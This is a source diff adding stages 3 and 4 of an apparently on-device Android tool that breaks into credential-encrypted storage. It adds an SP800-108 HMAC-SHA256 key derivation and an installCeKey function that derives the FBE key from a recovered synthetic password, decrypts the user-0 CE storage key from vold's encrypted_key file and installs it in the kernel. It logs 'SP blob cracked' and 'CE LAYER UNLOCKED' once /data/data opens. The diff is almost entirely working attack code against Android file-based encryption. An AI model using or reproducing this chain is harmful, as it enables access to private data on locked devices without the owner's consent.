@@ -59,6 +59,7 @@
 #include <android/binder_status.h>
 #include <android/log.h>
 #include <openssl/evp.h>
+#include <openssl/hmac.h>
 #include <openssl/sha.h>
 
 #include <fcntl.h>
@@ -215,6 +216,31 @@ bool swGcmDecrypt(const std::vector<uint8_t>& key32, const std::vector<uint8_t>&
     EVP_CIPHER_CTX_free(ctx);
     if (ok) out->resize(outl + finl);
     return ok;
+}
+
+// NIST SP800-108 counter-mode KDF (HmacSHA256, single 32B block) as used by LSS
+// SyntheticPassword.deriveSubkey for v3: HMAC-SHA256(key, [BE32(1)][label][0x00][context]
+// [BE32(len(context)*8)][BE32(256)]).
+std::vector<uint8_t> sp800Derive(const std::vector<uint8_t>& key, const std::string& label,
+                                 const std::string& context) {
+    std::vector<uint8_t> fixed;
+    auto be32 = [&](uint32_t v) {
+        fixed.push_back((v >> 24) & 0xff);
+        fixed.push_back((v >> 16) & 0xff);
+        fixed.push_back((v >> 8) & 0xff);
+        fixed.push_back(v & 0xff);
+    };
+    be32(1);  // counter
+    fixed.insert(fixed.end(), label.begin(), label.end());
+    fixed.push_back(0);
+    fixed.insert(fixed.end(), context.begin(), context.end());
+    be32(static_cast<uint32_t>(context.size()) * 8);  // context bit-length
+    be32(256);                                        // L (output bits)
+    uint8_t mac[32];
+    unsigned int maclen = sizeof(mac);
+    HMAC(EVP_sha256(), key.data(), static_cast<int>(key.size()), fixed.data(), fixed.size(), mac,
+         &maclen);
+    return std::vector<uint8_t>(mac, mac + maclen);
 }
 
 // Client-side AIBinder_Class stubs for the hand-marshalled IWeaver proxy (we never receive
@@ -541,6 +567,52 @@ bool unwrapSyntheticPassword(const std::shared_ptr<IKeyMintDevice>& km,
     return true;
 }
 
+// CE stages 3+4: SP -> FBE disk key -> unwrap + install the user-0 CE key.
+//   STAGE 3: fbeKey = SP800Derive(SP, "fbe-key", "android-synthetic-password-personalization-context")
+//   STAGE 4: vold KeyStorage decryptWithoutKeystore on ce/0/current/encrypted_key:
+//     ce/0/current has no secdiscardable => secdiscardable_hash="" => appId = "" + secret(fbeKey)
+//     kek = SHA512(pad128("Android key wrapping key generation SHA512") || appId)[:32]
+//     CE storage key = AES-256-GCM decrypt(encrypted_key=[12B IV][ct+tag], kek)  [software]
+//     then (hw-wrapped, like DE): convertStorageKeyToEphemeral -> FS_IOC_ADD_ENCRYPTION_KEY
+//   (no storage binding seed set on this device - proven by the DE keys unwrapping with
+//    appId=secdiscardable_hash only.)
+bool installCeKey(const std::shared_ptr<IKeyMintDevice>& km, const std::vector<uint8_t>& sp) {
+    std::vector<uint8_t> fbeKey =
+        sp800Derive(sp, "fbe-key", "android-synthetic-password-personalization-context");
+    LINE("  fbeKey (disk decryption key)[:8]=%s", hex(fbeKey.data(), 8).c_str());
+
+    std::vector<uint8_t> encKey;
+    if (!readFile("/data/misc/vold/user_keys/ce/0/current/encrypted_key", &encKey) ||
+        encKey.size() < kGcmNonceLen + 16) {
+        LINE("  ce/0/current/encrypted_key missing/short");
+        return false;
+    }
+    std::vector<uint8_t> kek =
+        personalizedHash("Android key wrapping key generation SHA512", fbeKey);  // appId = fbeKey
+    kek.resize(32);
+    std::vector<uint8_t> iv(encKey.begin(), encKey.begin() + kGcmNonceLen);
+    std::vector<uint8_t> ct(encKey.begin() + kGcmNonceLen, encKey.end());
+    std::vector<uint8_t> ceStorageKey;
+    if (!swGcmDecrypt(kek, iv, ct, &ceStorageKey)) {
+        LINE("  CE encrypted_key GCM decrypt failed (wrong fbeKey / storage binding seed set?)");
+        return false;
+    }
+    LINE("  CE storage key decrypted: %zuB", ceStorageKey.size());
+
+    std::vector<uint8_t> ephemeral;
+    if (!toEphemeral(km, ceStorageKey, &ephemeral)) {
+        LINE("  CE convertStorageKeyToEphemeral failed");
+        return false;
+    }
+    std::string gotId;
+    if (addHwWrappedKey(ephemeral, &gotId) != 0) {
+        LINE("  CE FS_IOC_ADD failed");
+        return false;
+    }
+    LINE("  CE KEY INSTALLED, kernel id=%s", gotId.c_str());
+    return true;
+}
+
 }  // namespace
 
 static bool dirReadable(const char* path) {
@@ -598,6 +670,16 @@ int main() {
             std::vector<uint8_t> sp;
             if (unwrapSyntheticPassword(km, weaverValue, &sp)) {
                 LINE("CE stage 2 OK: synthetic password recovered (%zuB) - SP blob cracked", sp.size());
+                LINE("--- CE stage 3+4: fbe-key derive + install user-0 CE key ---");
+                if (installCeKey(km, sp)) {
+                    int mfd = open("/data/data", O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+                    bool dataOpen = mfd >= 0;
+                    if (mfd >= 0) close(mfd);
+                    LINE("CE stage 3+4 DONE: /data/data %s",
+                         dataOpen ? "opens - CE LAYER UNLOCKED" : "open-failed (check)");
+                } else {
+                    LINE("CE stage 3+4 failed (see status above)");
+                }
             } else {
                 LINE("CE stage 2 failed (see status above)");
             }
